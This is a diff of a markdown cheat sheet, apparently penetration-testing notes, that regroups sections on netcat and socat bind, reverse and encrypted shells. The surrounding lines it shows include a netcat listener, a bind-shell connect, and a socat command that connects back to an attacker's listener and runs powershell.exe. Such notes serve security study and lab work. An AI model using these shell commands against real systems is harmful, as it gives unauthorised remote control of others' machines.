@@ -11,17 +11,19 @@
     2.2 Connect to listener on target from attack machine
 ```
 
-## Examples
+## Netcat bind shell
 
-### Netcat shells
+To obtain a bind shell on a target where there is already a listener waiting on a chosen port of the target:
+
+    # nc <target-ip> <chosen-port>
+
+## Netcat reverse shell
 
 Starting a `netcat` listener on Linux for receiving from a reverse shell of the target:
 
     # nc -lvnp <port-number>
 
-To obtain a bind shell on a target where there is already a listener waiting on a chosen port of the target:
-
-    # nc <target-ip> <chosen-port>
+## Stabilising netcat shells
 
 Stabilise a `netcat` shell on Linux systems:
 
@@ -63,9 +65,7 @@ Then use:
 The third way to stabilise a shell is to use a netcat shell as a stepping stone into a more fully-featured `socat` 
 shell. 
 
-### Socat shells
-
-#### Reverse
+## Socat reverse shells
 
 A basic reverse shell listener in `socat`:
 
@@ -79,7 +79,7 @@ To connect back to the listener on a Windows target system:
 
     socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 
-#### Bind
+## Socat bind shells
 
 Set up a listener on a Linux target:
 
@@ -97,7 +97,7 @@ Regardless of the target machine, connect to the waiting listener with:
 
 For a fully stable Linux tty reverse shell, use the `tty` technique.
 
-### Socat encrypted shells
+## Socat encrypted shells
 
 Setting up an OPENSSL-LISTENER using the `tty` technique and a PEM file called `encrypt.pem`:
 
